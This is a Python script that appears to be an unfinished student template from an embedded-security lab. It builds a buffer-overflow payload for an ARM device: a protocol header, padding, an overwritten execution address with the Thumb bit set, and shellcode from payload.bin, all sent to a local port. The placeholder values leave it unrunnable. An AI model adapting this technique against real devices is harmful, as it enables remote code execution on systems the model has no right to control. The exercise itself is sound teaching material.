import struct
import socket
import os

HOST = "127.0.0.1"
PORT = (os.getuid() % 4096) + 1024

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print(f'Connecting to {HOST} using port {PORT} (from UID)')

    s.connect((HOST, PORT))
    print(f'Connected')

    # Create protocol header. The header is defined as:
    # 	uint16_t magic_value;      // Magic value is always 0x1234
	#   uint16_t payload_length;   // Length of the data after protocol header
    protocol_header = struct.pack('<HH',
        0x1234,         # magic_value
        0xCHANGE_ME     # payload_length - you need to set this!
    )

    # Create some pad data for filling the rx buffer and placing payload_xip_address at correct address
    pad_data = b''
    for i in range(40): # <=CHANGE_ME: Same padding as for objective3 should work
        pad_data += i.to_bytes(1, 'little')

    # payload_xip_address should point at the executable code in the payload
    # You must add 1 to the address to indicate using ARM Thumb mode
    payload_xip_address = 0xCHANGE_ME
    print(f'payload_xip_address: {payload_xip_address:08x}')

    with open('payload.bin', 'rb') as file:
        payload = file.read()

    # For executing payload
    data = protocol_header + pad_data + payload_xip_address.to_bytes(4, 'little') + payload
    print('Sending data:')
    print(f'0x{data.hex()}')
    s.sendall(data)
